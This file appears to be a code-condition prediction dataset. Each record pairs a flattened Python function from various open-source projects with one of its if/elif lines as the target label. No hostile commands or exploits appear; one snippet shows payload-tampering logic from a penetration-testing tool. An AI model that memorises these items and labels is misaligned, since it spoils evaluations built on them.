{"input": "def init_weights(self): for module in self.decoder.modules(): if isinstance(module, (nn.Linear, nn.Embedding)): module.weight.data.normal_(mean=0.0, std=0.02) elif isinstance(module, nn.LayerNorm): module.bias.data.zero_() module.weight.data.fill_(1.0) if isinstance(module, nn.Linear) and module.bias is not None: module.bias.data.zero_() for p in self.generator.parameters(): if p.dim() > 1: xavier_uniform_(p) else: p.data.zero_()", "label": "if isinstance ( module , ( nn . Linear , nn . Embedding ) ) :"}
{"input": "def backfill_first_message_id( apps: StateApps, schema_editor: DatabaseSchemaEditor ) -> None: Stream = apps.get_model(\"zerver\", \"Stream\") Message = apps.get_model(\"zerver\", \"Message\") for stream in Stream.objects.all(): first_message = Message.objects.filter( recipient__type_id=stream.id, recipient__type=2 ).first() if first_message is None: # No need to change anything if the outcome is the default of None continue stream.first_message_id = first_message.id stream.save()", "label": "if first_message is None :"}
{"input": "def commandComplete(self, cmd): if self.property: if cmd.didFail(): return result = self.observer.getStdout() if self.strip: result = result.strip() propname = self.property self.setProperty(propname, result, \"SetPropertyFromCommand Step\") self.property_changes[propname] = result else: new_props = self.extract_fn( cmd.rc, self.observer.getStdout(), self.observer.getStderr() ) for k, v in iteritems(new_props): self.setProperty(k, v, \"SetPropertyFromCommand Step\") self.property_changes = new_props", "label": "if self . strip :"}
{"input": "def part(p, imaginary): # Represent infinity as 1e1000 and NaN as 1e1000-1e1000. s = \"j\" if imaginary else \"\" try: if math.isinf(p): if p < 0: return \"-1e1000\" + s return \"1e1000\" + s if math.isnan(p): return \"(1e1000%s-1e1000%s)\" % (s, s) except OverflowError: # math.isinf will raise this when given an integer # that's too large to convert to a float. pass return repr(p) + s", "label": "if math . isnan ( p ) :"}
{"input": "def _user_has_perm(user, perm, obj): anon = user.is_anonymous() for backend in auth.get_backends(): if not anon or backend.supports_anonymous_user: if hasattr(backend, \"has_perm\"): if obj is not None: if backend.supports_object_permissions and backend.has_perm( user, perm, obj ): return True else: if backend.has_perm(user, perm): return True return False", "label": "if obj is not None :"}
{"input": "def check_backslashes(payload): # Check for single quotes if payload.count(\"\\\\\") >= 15: if not settings.TAMPER_SCRIPTS[\"backslashes\"]: if menu.options.tamper: menu.options.tamper = menu.options.tamper + \",backslashes\" else: menu.options.tamper = \"backslashes\" from src.core.tamper import backslashes payload = backslashes.tamper(payload)", "label": "if not settings . TAMPER_SCRIPTS [ \"backslashes\" ] :"}
{"input": "def _check_model(cls): errors = [] if cls._meta.proxy: if cls._meta.local_fields or cls._meta.local_many_to_many: errors.append( checks.Error( \"Proxy model '%s' contains model fields.\" % cls.__name__, id=\"models.E017\", ) ) return errors", "label": "if cls . _meta . local_fields or cls . _meta . local_many_to_many :"}
{"input": "def _format_column_list(self, data): # Now we have all lis of columns which we need # to include in our create definition, Let's format them if \"columns\" in data: for c in data[\"columns\"]: if \"attacl\" in c: c[\"attacl\"] = parse_priv_to_db(c[\"attacl\"], self.column_acl) # check type for '[]' in it if \"cltype\" in c: c[\"cltype\"], c[\"hasSqrBracket\"] = column_utils.type_formatter( c[\"cltype\"] )", "label": "if \"cltype\" in c :"}
{"input": "def _extract_constant_functions(slither: SlitherCore) -> Dict[str, List[str]]: ret: Dict[str, List[str]] = {} for contract in slither.contracts: cst_functions = [ _get_name(f) for f in contract.functions_entry_points if _is_constant(f) ] cst_functions += [ v.function_name for v in contract.state_variables if v.visibility in [\"public\"] ] if cst_functions: ret[contract.name] = cst_functions return ret", "label": "if cst_functions :"}
{"input": "def safe_zip(*args): \"\"\"Like zip, but ensures arguments are of same length\"\"\" base = len(args[0]) for i, arg in enumerate(args[1:]): if len(arg) != base: raise ValueError( \"Argument 0 has length %d but argument %d has \" \"length %d\" % (base, i + 1, len(arg)) ) return zip(*args)", "label": "if len ( arg ) != base :"}
{"input": "def readMemory(self, va, size): ret = b\"\" while size: pageva = va & self.pagemask pageoff = va - pageva chunksize = min(self.pagesize - pageoff, size) page = self.pagecache.get(pageva) if page is None: page = self.mem.readMemory(pageva, self.pagesize) self.pagecache[pageva] = page ret += page[pageoff : pageoff + chunksize] va += chunksize size -= chunksize return ret", "label": "if page is None :"}
{"input": "def horizontal_neighbors_iter(self, ordered=True): n_horizontal_edges_per_y = self.x_dimension - ( self.x_dimension <= 2 or not self.periodic ) for x in range(n_horizontal_edges_per_y): for y in range(self.y_dimension): i = self.to_site_index((x, y)) j = self.to_site_index(((x + 1) % self.x_dimension, y)) yield (i, j) if ordered: yield (j, i)", "label": "if ordered :"}
{"input": "def apply_ordering(self, query): ordering = request.args.get(\"ordering\") or \"\" if ordering: desc, column = ordering.startswith(\"-\"), ordering.lstrip(\"-\") if column in self.model._meta.fields: field = self.model._meta.fields[column] query = query.order_by(field.asc() if not desc else field.desc()) return query", "label": "if column in self . model . _meta . fields :"}
{"input": "def check_hashes(self, string): for hash in self.hashes.copy(): ctext, hash = self.check_hash(hash, string) if ctext is not None: yield ctext, hash self.found.add(hash) self.hashes.remove(hash)", "label": "if ctext is not None :"}
{"input": "def undo_block_stop(self): if self.undoblock.bump_depth(-1) == 0: cmd = self.undoblock self.undoblock = 0 if len(cmd) > 0: if len(cmd) == 1: # no need to wrap a single cmd cmd = cmd.getcmd(0) # this blk of cmds, or single cmd, has already # been done, so don't execute it again self.addcmd(cmd, 0)", "label": "if len ( cmd ) == 1 :"}
{"input": "def create_model_handler(ns, model_type): @route(f\"/<provider>/{ns}/<model_id>\") @use_provider def handle(req, provider, model_id): # special cases: # fuo://<provider>/users/me -> show current logged user if model_type == ModelType.user: if model_id == \"me\": user = getattr(provider, \"_user\", None) if user is None: raise CmdException(f\"log in provider:{provider.identifier} first\") return user model = get_model_or_raise(provider, model_type, model_id) return model", "label": "if model_id == \"me\" :"}
{"input": "def _remove_optional_none_type_hints(self, type_hints, defaults): # If argument has None as a default, typing.get_type_hints adds # optional None to the information it returns. We don't want that. for arg in defaults: if defaults[arg] is None and arg in type_hints: type_ = type_hints[arg] if self._is_union(type_): types = type_.__args__ if len(types) == 2 and types[1] is type(None): type_hints[arg] = types[0]", "label": "if self . _is_union ( type_ ) :"}
{"input": "def set_billing_hours_and_amount(self): if not self.project: for timesheet in self.timesheets: ts_doc = frappe.get_doc(\"Timesheet\", timesheet.time_sheet) if not timesheet.billing_hours and ts_doc.total_billable_hours: timesheet.billing_hours = ts_doc.total_billable_hours if not timesheet.billing_amount and ts_doc.total_billable_amount: timesheet.billing_amount = ts_doc.total_billable_amount", "label": "if not timesheet . billing_hours and ts_doc . total_billable_hours :"}
{"input": "def _real_len(self, s): s_len = 0 in_esc = False prev = \" \" for c in replace_all({\"\\0+\": \"\", \"\\0-\": \"\", \"\\0^\": \"\", \"\\1\": \"\", \"\\t\": \" \"}, s): if in_esc: if c == \"m\": in_esc = False else: if c == \"[\" and prev == \"\\033\": in_esc = True s_len -= 1 # we counted prev when we shouldn't have else: s_len += self._display_len(c) prev = c return s_len", "label": "if c == \"[\" and prev == \"\\033\" :"}
{"input": "def _find_node_with_predicate(self, node, predicate): if node != self._tree._root and predicate(node): return node item, cookie = self._tree.GetFirstChild(node) while item: if predicate(item): return item if self._tree.ItemHasChildren(item): result = self._find_node_with_predicate(item, predicate) if result: return result item, cookie = self._tree.GetNextChild(node, cookie) return None", "label": "if result :"}
{"input": "def main(): parser = optparse.OptionParser() options, argv = parser.parse_args() counts = defaultdict(int) for line in fileinput.input(argv): try: tweet = json.loads(line) except: continue if \"retweeted_status\" not in tweet: continue rt = tweet[\"retweeted_status\"] id = rt[\"id_str\"] count = rt[\"retweet_count\"] if count > counts[id]: counts[id] = count for id in sorted(counts, key=counts.get, reverse=True): print(\"{},{}\".format(id, counts[id]))", "label": "if count > counts [ id ] :"}
{"input": "def to_get_select_object_meta(meta_param): if meta_param is not None and SelectParameters.Json_Type in meta_param: if meta_param[SelectParameters.Json_Type] != SelectJsonTypes.LINES: raise SelectOperationClientError( \"Json_Type can only be 'LINES' for creating meta\", \"\" ) else: return to_get_select_json_object_meta(meta_param) else: return to_get_select_csv_object_meta(meta_param)", "label": "if meta_param [ SelectParameters . Json_Type ] != SelectJsonTypes . LINES :"}
{"input": "def check_if_match(self, value, index, flags=0): pattern = self.get_pattern(index) if value: if _is_iterable(value): if any([bool(re.search(pattern, x, flags)) for x in value]): return True else: if isinstance(value, (int, long)): value = str(value) return bool(re.search(pattern, value, flags)) return False", "label": "if any ( [ bool ( re . search ( pattern , x , flags ) ) for x in value ] ) :"}
{"input": "def assemble( self, multi_model_placement: Dict[Model, PhysicalDevice] ) -> Tuple[Node, PhysicalDevice]: for node in self.origin_nodes: if node.original_graph.model in multi_model_placement: new_node = Node( node.original_graph, node.id, f\"M_{node.original_graph.model.model_id}_{node.name}\", node.operation, ) return new_node, multi_model_placement[node.original_graph.model] raise ValueError( f\"DedupInputNode {self.name} does not contain nodes from multi_model\" )", "label": "if node . original_graph . model in multi_model_placement :"}
{"input": "def doc_generator(self, imdb_dir, dataset, include_label=False): dirs = [ (os.path.join(imdb_dir, dataset, \"pos\"), True), (os.path.join(imdb_dir, dataset, \"neg\"), False), ] for d, label in dirs: for filename in os.listdir(d): with tf.gfile.Open(os.path.join(d, filename)) as imdb_f: doc = imdb_f.read().strip() if include_label: yield doc, label else: yield doc", "label": "if include_label :"}
{"input": "def test_empty_condition_node(cond_node): for node in [cond_node.true_node, cond_node.false_node]: if node is None: continue if type(node) is CodeNode and BaseNode.test_empty_node(node.node): continue if BaseNode.test_empty_node(node): continue return False return True", "label": "if type ( node ) is CodeNode and BaseNode . test_empty_node ( node . node ) :"}
{"input": "def rewrite_imports(package_dir, vendored_libs, vendor_dir): for item in package_dir.iterdir(): if item.is_dir(): rewrite_imports(item, vendored_libs, vendor_dir) elif item.name.endswith(\".py\"): rewrite_file_imports(item, vendored_libs, vendor_dir)", "label": "elif item . name . endswith ( \".py\" ) :"}
{"input": "def ageToDays(self, age_str): age = 0 age_str = age_str.replace(\"&nbsp;\", \" \") regex = \"(\\d*.?\\d+).(sec|hour|day|week|month|year)+\" matches = re.findall(regex, age_str) for match in matches: nr, size = match mult = 1 if size == \"week\": mult = 7 elif size == \"month\": mult = 30.5 elif size == \"year\": mult = 365 age += tryInt(nr) * mult return tryInt(age)", "label": "elif size == \"month\" :"}
{"input": "def _validate_zone(self): availability_zone = self.availability_zone if availability_zone: zone = self.ec2.get_zone(availability_zone) if not zone: raise exception.ClusterValidationError( \"availability_zone = %s does not exist\" % availability_zone ) if zone.state != \"available\": log.warn( \"The availability_zone = %s \" % zone + \"is not available at this time\" ) return True", "label": "if zone . state != \"available\" :"}
{"input": "def addnoise(line): noise = fillers ratio = len(line) // len(noise) res = \"\" while line and noise: if len(line) // len(noise) > ratio: c, line = line[0], line[1:] else: c, noise = noise[0], noise[1:] res += c return res + noise + line", "label": "if len ( line ) // len ( noise ) > ratio :"}
{"input": "def cwr1(iterable, r): \"Pure python version shown in the docs\" # number items returned: (n+r-1)! / r! / (n-1)! when n>0 pool = tuple(iterable) n = len(pool) if not n and r: return indices = [0] * r yield tuple(pool[i] for i in indices) while 1: for i in reversed(range(r)): if indices[i] != n - 1: break else: return indices[i:] = [indices[i] + 1] * (r - i) yield tuple(pool[i] for i in indices)", "label": "if indices [ i ] != n - 1 :"}
{"input": "def subscribe(self, params) -> bool: emit_data = {\"method\": \"eth_subscribe\", \"params\": params} nonce = await self._send(emit_data) raw_message = await self._client.recv() if raw_message is not None: resp = ujson.loads(raw_message) if resp.get(\"id\", None) == nonce: self._node_address = resp.get(\"result\") return True return False", "label": "if resp . get ( \"id\" , None ) == nonce :"}
{"input": "def _(node): for __ in dir(node): if not __.startswith(\"_\"): candidate = getattr(node, __) if isinstance(candidate, str): if \"\\\\\" in candidate: try: re.compile(candidate) except: errMsg = \"smoke test failed at compiling '%s'\" % candidate logger.error(errMsg) raise else: _(candidate)", "label": "if not __ . startswith ( \"_\" ) :"}
{"input": "def get_field_values(self, fields): field_values = [] for field in fields: # Title is special case if field == \"title\": value = self.get_title_display() elif field == \"country\": try: value = self.country.printable_name except exceptions.ObjectDoesNotExist: value = \"\" elif field == \"salutation\": value = self.salutation else: value = getattr(self, field) field_values.append(value) return field_values", "label": "elif field == \"country\" :"}
{"input": "def __str__(self): s = \"\" for k, v in self._members.items(): if isinstance(v.get(\"type\"), list): s += k + \" : \" + \";\".join(getattr(self, item)) + \"\\n\" elif isinstance(v.get(\"type\"), str): s += k + \" : \" + getattr(self, k) + \"\\n\" return s", "label": "elif isinstance ( v . get ( \"type\" ) , str ) :"}
{"input": "def _merge(self, a, b, path=None): \"\"\"Merge two dictionaries, from http://stackoverflow.com/questions/7204805/dictionaries-of-dictionaries-merge\"\"\" if path is None: path = [] for key in b: if key in a: if isinstance(a[key], dict) and isinstance(b[key], dict): self._merge(a[key], b[key], path + [str(key)]) elif a[key] == b[key]: pass # same leaf value else: raise Exception(\"Conflict at %s\" % \".\".join(path + [str(key)])) else: a[key] = b[key] return a", "label": "elif a [ key ] == b [ key ] :"}
{"input": "def get_child_nodes(node): if isinstance(node, _ast.Module): return node.body result = [] if node._fields is not None: for name in node._fields: child = getattr(node, name) if isinstance(child, list): for entry in child: if isinstance(entry, _ast.AST): result.append(entry) if isinstance(child, _ast.AST): result.append(child) return result", "label": "if isinstance ( child , _ast . AST ) :"}
{"input": "def _handle_enter(self) -> None: if self.multiple_selection: val = self.values[self._selected_index][0] if val in self.current_values: self.current_values.remove(val) else: self.current_values.append(val) else: self.current_value = self.values[self._selected_index][0]", "label": "if val in self . current_values :"}
{"input": "def close_all(map=None, ignore_all=False): if map is None: # pragma: no cover map = socket_map for x in list(map.values()): # list() FBO py3 try: x.close() except OSError as x: if x.args[0] == EBADF: pass elif not ignore_all: raise except _reraised_exceptions: raise except: if not ignore_all: raise map.clear()", "label": "if x . args [ 0 ] == EBADF :"}
{"input": "def _get_spawn_property(self, constraints, constraint_name, services): if services: # this isn't very nice if constraint_name == IMAGE_CONSTRAINT: return services[0].image elif constraint_name == CPUS_CONSTRAINT: return services[0].cpus for constraint in constraints: if constraint.name == constraint_name: return constraint.value return None", "label": "if constraint . name == constraint_name :"}
{"input": "def _handle_children(self, removed, added): # Stop all the removed children. for obj in removed: obj.stop() # Process the new objects. for obj in added: obj.set(scene=self.scene, parent=self) if isinstance(obj, ModuleManager): obj.source = self elif is_filter(obj): obj.inputs.append(self) if self.running: try: obj.start() except: exception()", "label": "elif is_filter ( obj ) :"}
{"input": "def _get_cols_width(self, values): width = 14 for row in values: for header in self.headers: header_len = len(header) if header_len > width: width = header_len value_len = len(unicode(row.get(header, \"\"))) if value_len > width: width = value_len width += 2 return width", "label": "if value_len > width :"}
{"input": "def crawl(self, *args, **kwargs): assert not self.crawling, \"Crawling already taking place\" self.crawling = True try: self.spider = self._create_spider(*args, **kwargs) self.engine = self._create_engine() if self.start_requests: start_requests = iter(self.spider.start_requests()) else: start_requests = () yield self.engine.open_spider(self.spider, start_requests) yield defer.maybeDeferred(self.engine.start) except Exception: self.crawling = False raise", "label": "if self . start_requests :"}
{"input": "def _copy_files(self, files, src, dest, message=\"\"): for filepath in files: srcpath = os.path.join(src, filepath) destpath = os.path.join(dest, filepath) if message: print(\"{}: {}\".format(message, destpath)) if os.path.exists(srcpath): destdir = os.path.dirname(destpath) if not os.path.isdir(destdir): os.makedirs(destdir) shutil.copy(srcpath, destpath) elif os.path.exists(destpath): os.remove(destpath)", "label": "if message :"}
{"input": "def describe_tags(self): resource_arns = self._get_multi_param(\"ResourceArns.member\") resources = [] for arn in resource_arns: if \":targetgroup\" in arn: resource = self.elbv2_backend.target_groups.get(arn) if not resource: raise TargetGroupNotFoundError() elif \":loadbalancer\" in arn: resource = self.elbv2_backend.load_balancers.get(arn) if not resource: raise LoadBalancerNotFoundError() else: raise LoadBalancerNotFoundError() resources.append(resource) template = self.response_template(DESCRIBE_TAGS_TEMPLATE) return template.render(resources=resources)", "label": "if \":targetgroup\" in arn :"}
{"input": "def iterator(): try: while True: yield from pullparser.read_events() # load event buffer data = source.read(16 * 1024) if not data: break pullparser.feed(data) root = pullparser._close_and_return_root() yield from pullparser.read_events() it.root = root finally: if close_source: source.close()", "label": "if not data :"}
{"input": "def __repr__(self): data = \"\" for c in self.children: data += c.shortrepr() if len(data) > 60: data = data[:56] + \" ...\" break if self[\"names\"]: return '<%s \"%s\": %s>' % ( self.__class__.__name__, \"; \".join([ensure_str(n) for n in self[\"names\"]]), data, ) else: return \"<%s: %s>\" % (self.__class__.__name__, data)", "label": "if len ( data ) > 60 :"}
{"input": "def __exit__(self, exc_type, exc_value, traceback): template_rendered.disconnect(self.on_template_render) if exc_type is not None: return if not self.test(): message = self.message() if len(self.rendered_templates) == 0: message += \" No template was rendered.\" else: message += \" Following templates were rendered: %s\" % ( \", \".join(self.rendered_template_names) ) self.test_case.fail(message)", "label": "if len ( self . rendered_templates ) == 0 :"}
{"input": "def _match(self, byte_chunk): quote_character = None data = byte_chunk.nhtml open_angle_bracket = data.rfind(\"<\") # We are inside <... if open_angle_bracket <= data.rfind(\">\"): return False for s in data[open_angle_bracket + 1 :]: if s in ATTR_DELIMITERS: if quote_character and s == quote_character: quote_character = None continue elif not quote_character: quote_character = s continue if quote_character == self.quote_character: return True return False", "label": "elif not quote_character :"}
{"input": "def recent_events(self, events): try: frame = self.get_frame() except EndofVideoFileError: logger.info(\"Video has ended.\") self.notify_all( {\"subject\": \"file_source.video_finished\", \"source_path\": self.source_path} ) self.play = False else: self._recent_frame = frame events[\"frame\"] = frame if self.timed_playback: self.wait(frame)", "label": "if self . timed_playback :"}
{"input": "def _prune(self): if self.over_threshold(): now = time.time() for idx, (key, (expires, _)) in enumerate(self._cache.items()): if expires is not None and expires <= now or idx % 3 == 0: with self._mutex: self._cache.pop(key, None)", "label": "if expires is not None and expires <= now or idx % 3 == 0 :"}
{"input": "def dict_path(d, path): if not isinstance(path, (list, tuple)): raise ValueError() for keys in path: if type(keys) is not list: keys = [keys] value = None for key in keys: if key not in d: continue value = d[key] if value is None: value = {} for key in keys: d[key] = value d = value return d", "label": "if key not in d :"}
{"input": "def span_tokenize(self, string): if self.__tokenizer == \"nltk\": raw_tokens = nltk.word_tokenize(string) if ('\"' in string) or (\"''\" in string): matched = [m.group() for m in re.finditer(r\"``|'{2}|\\\"\", string)] tokens = [ matched.pop(0) if tok in ['\"', \"``\", \"''\"] else tok for tok in raw_tokens ] else: tokens = raw_tokens spans = align_tokens(tokens, string) return spans", "label": "if ( '\"' in string ) or ( \"''\" in string ) :"}
{"input": "def literal(self): if self.peek('\"'): lit, lang, dtype = self.eat(r_literal).groups() if lang: lang = lang else: lang = None if dtype: dtype = dtype else: dtype = None if lang and dtype: raise ParseError(\"Can't have both a language and a datatype\") lit = unquote(lit) return Literal(lit, lang, dtype) return False", "label": "if lang and dtype :"}
{"input": "def get(): result = [] for b in self.key_bindings: if len(keys) < len(b.keys): match = True for i, j in zip(b.keys, keys): if i != j and i != Keys.Any: match = False break if match: result.append(b) return result", "label": "if i != j and i != Keys . Any :"}
{"input": "def _compileRules(rulesList, maxLength=4): ruleChecking = collections.defaultdict(list) for ruleIndex in range(len(rulesList)): args = [] if len(rulesList[ruleIndex]) == maxLength: args = rulesList[ruleIndex][-1] if maxLength == 4: (shouldRunMethod, method, isCorrect) = rulesList[ruleIndex][0:3] ruleChecking[shouldRunMethod].append((method, isCorrect, args)) elif maxLength == 3: (shouldRunMethod, method) = rulesList[ruleIndex][0:2] ruleChecking[shouldRunMethod].append((method, args)) return ruleChecking", "label": "if maxLength == 4 :"}
{"input": "def parents_in_pipfile(self): if not self._parents_in_pipfile: self._parents_in_pipfile = [ p for p in self.flattened_parents if p.normalized_name in self.pipfile_packages ] return self._parents_in_pipfile", "label": "if p . normalized_name in self . pipfile_packages"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_content(d.getPrefixedString()) continue if tt == 18: self.set_blob_key(d.getPrefixedString()) continue if tt == 24: self.set_width(d.getVarInt32()) continue if tt == 32: self.set_height(d.getVarInt32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 18 :"}
{"input": "def base64_encode_image_mapper(self, tag, url): if tag == \"img\": if url in self.kp_images: image_data = base64.b64encode(self.kp_images[url]) image_mimetype = mimetypes.guess_type(url)[0] if image_mimetype is not None: return \"data:{};base64, \".format(image_mimetype) + image_data.decode( \"utf-8\" ) return None", "label": "if url in self . kp_images :"}
{"input": "def get_args_from_ref_args(handler, ref_args): args = [] for ref_arg in ref_args: if type(ref_arg) is ref.array_type: temp = handler.create_from_numpy(ref_arg) args.append(temp) else: args.append(ref_arg) return args", "label": "if type ( ref_arg ) is ref . array_type :"}
{"input": "def _get_cols_width(self, values): width = 14 for row in values: for header in self.headers: header_len = len(header) if header_len > width: width = header_len value_len = len(unicode(row.get(header, \"\"))) if value_len > width: width = value_len width += 2 return width", "label": "if header_len > width :"}
{"input": "def OnLeaveWindow(self, event): if self.start_drag and not self.dragging: self.dragging = False self.start_drag = False self.dragged_tab = None self.drag_trigger = self.drag_trail if self.HasCapture(): self.ReleaseMouse() if self.preview_wnd: self.preview_wnd.Show(False) del self.preview_wnd self.preview_wnd = None event.Skip()", "label": "if self . HasCapture ( ) :"}
{"input": "def _checkPid(self, pid): retval = False if self.settings.windows: PROCESS_TERMINATE = 1 p = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, 0, pid) retval = p != 0 if p: ctypes.windll.kernel32.CloseHandle(p) else: # https://stackoverflow.com/questions/568271/how-to-check-if-there-exists-a-process-with-a-given-pid-in-python try: os.kill(pid, 0) except OSError: pass else: retval = True return retval", "label": "if p :"}
{"input": "def concat_index_value(index_values, store_data=False): result = pd.Index([]) if not isinstance(index_values, (list, tuple)): index_values = [index_values] for index_value in index_values: if isinstance(index_value, pd.Index): result = result.append(index_value) else: result = result.append(index_value.to_pandas()) return parse_index(result, store_data=store_data)", "label": "if isinstance ( index_value , pd . Index ) :"}
{"input": "def apply(self, db, family): if self.rtype: if self.rtype.is_custom() and self.use_regex: if self.regex[0].search(str(family.get_relationship())) is None: return False elif self.rtype != family.get_relationship(): return False return True", "label": "if self . regex [ 0 ] . search ( str ( family . get_relationship ( ) ) ) is None :"}
{"input": "def get_child_nodes(node): if isinstance(node, _ast.Module): return node.body result = [] if node._fields is not None: for name in node._fields: child = getattr(node, name) if isinstance(child, list): for entry in child: if isinstance(entry, _ast.AST): result.append(entry) if isinstance(child, _ast.AST): result.append(child) return result", "label": "if isinstance ( entry , _ast . AST ) :"}
{"input": "def output(self): \"\"\"Transform self into a list of (name, value) tuples.\"\"\" header_list = [] for k, v in self.items(): if isinstance(k, unicodestr): k = self.encode(k) if not isinstance(v, basestring): v = str(v) if isinstance(v, unicodestr): v = self.encode(v) # See header_translate_* constants above. # Replace only if you really know what you're doing. k = k.translate(header_translate_table, header_translate_deletechars) v = v.translate(header_translate_table, header_translate_deletechars) header_list.append((k, v)) return header_list", "label": "if isinstance ( v , unicodestr ) :"}
{"input": "def check_valid_emoji_name(emoji_name: str) -> None: if emoji_name: if re.match(r\"^[0-9a-z.\\-_]+(?<![.\\-_])$\", emoji_name): return raise JsonableError(_(\"Invalid characters in emoji name\")) raise JsonableError(_(\"Emoji name is missing\"))", "label": "if re . match ( r\"^[0-9a-z.\\-_]+(?<![.\\-_])$\" , emoji_name ) :"}
{"input": "def cache_subscriptions(self, region: str): async with self.regional_subscriptions_cache_locks.setdefault( region, asyncio.Lock() ): if region in self.subscriptions_cache: return self.subscriptions_cache[region] = await AWSFacadeUtils.get_all_pages( \"sns\", region, self.session, \"list_subscriptions\", \"Subscriptions\" ) for subscription in self.subscriptions_cache[region]: topic_arn = subscription.pop(\"TopicArn\") subscription[\"topic_name\"] = topic_arn.split(\":\")[-1]", "label": "if region in self . subscriptions_cache :"}
{"input": "def AdjustArg(arg, break_chars, argv_out): # type: (str, List[str], List[str]) -> None end_indices = [] # stores the end of each span state = ST_Begin for i, c in enumerate(arg): ch = CH_Break if c in break_chars else CH_Other state, emit_span = _TRANSITIONS[state, ch] if emit_span: end_indices.append(i) # Always emit a span at the end (even for empty string) end_indices.append(len(arg)) begin = 0 for end in end_indices: argv_out.append(arg[begin:end]) begin = end", "label": "if emit_span :"}
{"input": "def load_model( self, model_name: str, path: str = None, model_type=None ) -> AbstractModel: if isinstance(model_name, AbstractModel): return model_name if model_name in self.models.keys(): return self.models[model_name] else: if path is None: path = self.get_model_attribute(model=model_name, attribute=\"path\") if model_type is None: model_type = self.get_model_attribute(model=model_name, attribute=\"type\") return model_type.load(path=path, reset_paths=self.reset_paths)", "label": "if model_type is None :"}
{"input": "def find_config(pipeline_config_path: Union[str, Path]) -> Path: if not Path(pipeline_config_path).is_file(): configs = [ c for c in Path(__file__).parent.parent.parent.glob( f\"configs/**/{pipeline_config_path}.json\" ) if str(c.with_suffix(\"\")).endswith(pipeline_config_path) ] # a simple way to not allow * and ? if configs: log.info(f\"Interpreting '{pipeline_config_path}' as '{configs[0]}'\") pipeline_config_path = configs[0] return Path(pipeline_config_path)", "label": "if str ( c . with_suffix ( \"\" ) ) . endswith ( pipeline_config_path )"}
{"input": "def __init__(self, bounds, channel_axis, preprocess=None): assert len(bounds) == 2 assert channel_axis in [0, 1, 2, 3] self._bounds = bounds self._channel_axis = channel_axis # Make self._preprocess to be (0,1) if possible, so that don't need # to do substract or divide. if preprocess is not None: sub, div = np.array(preprocess) if not np.any(sub): sub = 0 if np.all(div == 1): div = 1 assert (div is None) or np.all(div) self._preprocess = (sub, div) else: self._preprocess = (0, 1)", "label": "if np . all ( div == 1 ) :"}
{"input": "def iter_imports(path): \"\"\"Yield imports in *path*\"\"\" for node in ast.parse(open(path, \"rb\").read()).body: if isinstance(node, ast.ImportFrom): if node.module is None: prefix = () else: prefix = tuple(node.module.split(\".\")) for snode in node.names: yield (node.level, prefix + (snode.name,)) elif isinstance(node, ast.Import): for node in node.names: yield (0, tuple(node.name.split(\".\")))", "label": "if node . module is None :"}
{"input": "def __init__(self, spec=None, add_book=True, xl=None, visible=None): # visible is only required on mac if spec is not None: warn(\"spec is ignored on Windows.\") if xl is None: # new instance self._xl = COMRetryObjectWrapper(DispatchEx(\"Excel.Application\")) if add_book: self._xl.Workbooks.Add() self._hwnd = None elif isinstance(xl, int): self._xl = None self._hwnd = xl else: self._xl = xl self._hwnd = None", "label": "if add_book :"}
{"input": "def _find_split(): \"\"\"Find the first = sign to split on (that isn't in [brackets])\"\"\" key = [] value = [] brackets = False chars = list(expression) while chars: c = chars.pop(0) if c == \"=\" and not brackets: # keys done the rest is value value = chars break elif c == \"[\": brackets = True key += c elif c == \"]\" and brackets: brackets = False key += c else: # normal character key += c return \"\".join(key), \"\".join(value)", "label": "elif c == \"[\" :"}
{"input": "def _ApplySizeLimit( regions: Iterable[rdf_memory.ProcessMemoryRegion], size_limit: int ) -> List[rdf_memory.ProcessMemoryRegion]: \"\"\"Truncates regions so that the total size stays in size_limit.\"\"\" total_size = 0 regions_in_limit = [] for region in regions: if total_size >= size_limit: break region.dumped_size = min(region.size, size_limit - total_size) regions_in_limit.append(region) total_size += region.dumped_size return regions_in_limit", "label": "if total_size >= size_limit :"}
{"input": "def _get_matched_files(input_path): \"\"\"Returns all files that matches the input_path.\"\"\" input_patterns = input_path.strip().split(\",\") all_matched_files = [] for input_pattern in input_patterns: input_pattern = input_pattern.strip() if not input_pattern: continue matched_files = tf.io.gfile.glob(input_pattern) if not matched_files: raise ValueError(\"%s does not match any files.\" % input_pattern) else: all_matched_files.extend(matched_files) return sorted(all_matched_files)", "label": "if not input_pattern :"}
{"input": "def _add_kid(key, x): if x is None: kids[key] = None else: if type(x) in (type([]), type(())): x1 = [i for i in x if isinstance(i, TVTKBase)] if x1: kids[key] = x1 elif isinstance(x, TVTKBase): if hasattr(x, \"__iter__\"): # Don't add iterable objects that contain non # acceptable nodes if len(list(x)) and isinstance(list(x)[0], TVTKBase): kids[key] = x else: kids[key] = x", "label": "if x1 :"}
{"input": "def _read_info(self, field): fs.File._read_info(self, field) if field == \"dimensions\": self.dimensions = self._plat_get_dimensions() if self._get_orientation() in {5, 6, 7, 8}: self.dimensions = (self.dimensions[1], self.dimensions[0]) elif field == \"exif_timestamp\": self.exif_timestamp = self._get_exif_timestamp()", "label": "if self . _get_orientation ( ) in { 5 , 6 , 7 , 8 } :"}
{"input": "def process_timeline(self, info): children = info.get(\"_children\", []) if not children: return False for entry in children: state = TIMELINE_STATES.get(entry.get(\"state\")) if not state: continue self.emit(\"%s.timeline.%s\" % (self.name, state), entry) return True", "label": "if not state :"}
{"input": "def from_chx(self): if self.array is not None: device = backend.get_device_from_array(self.array) else: device = self._initial_device if device.xp is chainerx: backend_name = device.device.backend.name if backend_name == \"native\": self._initial_device = backend.CpuDevice() elif backend_name == \"cuda\": self._initial_device = backend.GpuDevice.from_device_id(device.device.index) super(Parameter, self)._from_chx(allow_unchaining=True)", "label": "elif backend_name == \"cuda\" :"}
{"input": "def get_title_extensions(self, title=None): extensions = [] for extension in self.title_extensions: if title: extensions.extend(list(extension.objects.filter(extended_object=title))) else: extensions.extend(list(extension.objects.all())) return extensions", "label": "if title :"}
{"input": "def tag(vs, push=False): \"\"\"Make the tagged release commit\"\"\" patch_version(vs, repo_root) with cd(repo_root): run('git commit -a -m \"release {}\"'.format(vs)) run('git tag -a -m \"release {0}\" {0}'.format(vs)) if push: run(\"git push\") run(\"git push --tags\")", "label": "if push :"}
